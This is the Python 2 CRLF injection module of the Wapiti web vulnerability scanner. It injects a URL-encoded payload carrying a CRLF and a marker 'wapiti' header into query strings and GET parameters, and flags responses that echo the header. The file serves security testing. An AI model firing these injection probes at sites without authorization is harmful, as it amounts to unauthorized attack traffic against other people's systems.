import socket
from attack import Attack
from vulnerability import Vulnerability
import requests
from net import HTTP

# Wapiti SVN - A web application vulnerability scanner
# Wapiti Project (http://wapiti.sourceforge.net)
# Copyright (C) 2008 Nicolas Surribas
#
# David del Pozo
# Alberto Pastor
# Informatica Gesfor
# ICT Romulus (http://www.ict-romulus.eu)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

class mod_crlf(Attack):
  """
  This class implements a CRLF attack
  """

  name = "crlf"

  def __init__(self, HTTP, xmlRepGenerator):
    Attack.__init__(self, HTTP, xmlRepGenerator)

  # Won't work with PHP >= 4.4.2
  def attackGET(self, http_res):
    """This method performs the CRLF attack with method GET"""
    page = http_res.path
    params_list = http_res.get_params
    headers = http_res.headers

    payload = self.HTTP.quote("http://www.google.fr\r\nwapiti: SVN version")
    if not params_list:
      # Do not attack application-type files
      if not headers.has_key("content-type"):
        # Sometimes there's no content-type... so we rely on the document extension
        if (page.split(".")[-1] not in self.allowed) and page[-1] != "/":
          return
      elif headers["content-type"].find("text") == -1:
        return

      err = ""
      url = page + "?" + payload
      if url not in self.attackedGET:
        if self.verbose == 2:
          print "+ " + page + "?http://www.google.fr\\r\\nwapiti: SVN version"
        try:
          resp = self.HTTP.send(url)
          if resp.getHeaders().has_key('wapiti'):
            self.reportGen.logVulnerability(Vulnerability.CRLF, Vulnerability.HIGH_LEVEL_VULNERABILITY,
                              page, payload, err + " " + _("(QUERY_STRING)"), resp)
            print _("CRLF Injection (QUERY_STRING) in"), page
            print "  " + _("Evil url") + ":", url
        except requests.exceptions.Timeout, timeout:
          self.reportGen.logVulnerability(Vulnerability.RES_CONSUMPTION, Vulnerability.MEDIUM_LEVEL_VULNERABILITY,
                            page, payload, err + " " + _("(QUERY_STRING)"), timeout)
          print _("Timeout (QUERY_STRING) in"), page
          print "  " + _("caused by") + ":", url
        except requests.exceptions.HTTPError:
          #print "Error: The server did not understand this request"
          pass
        self.attackedGET.append(url)
    else:
      for i in range(len(params_list)):
        err = ""
        saved_value = params_list[i][1]
        # payload is already escaped, see at top
        params_list[i][1] = payload
        k = params_list[i][0]

        url = page + "?" + self.HTTP.encode(params_list)
        if url not in self.attackedGET:
          self.attackedGET.append(url)
          if self.verbose == 2:
            print "+", url
          try:
            resp = self.HTTP.send(url)
            if resp.getHeaders().has_key('wapiti'):
              err = _("CRLF Injection")
              self.reportGen.logVulnerability(Vulnerability.CRLF, Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                page, self.HTTP.encode(params_list), err + " (" + k + ")", resp)
              if self.color == 0:
                print err, "(" + k + ") " + _("in"), page
                print "  " + _("Evil url") + ":", url
              else:
                print err, ":", url.replace(k + "=", self.RED + k + self.STD + "=")
          except requests.exceptions.Timeout, timeout:
            self.reportGen.logVulnerability(Vulnerability.RES_CONSUMPTION, Vulnerability.MEDIUM_LEVEL_VULNERABILITY,
                              page, self.HTTP.encode(params_list), err + " (" + k + ")", timeout)
            print _("Timeout") + " (" + k + ") " + _("in"), page
            print "  " + _("caused by") + ":", url
          except requests.exceptions.HTTPError:
            print _("Error: The server did not understand this request")
        params_list[i][1] = saved_value

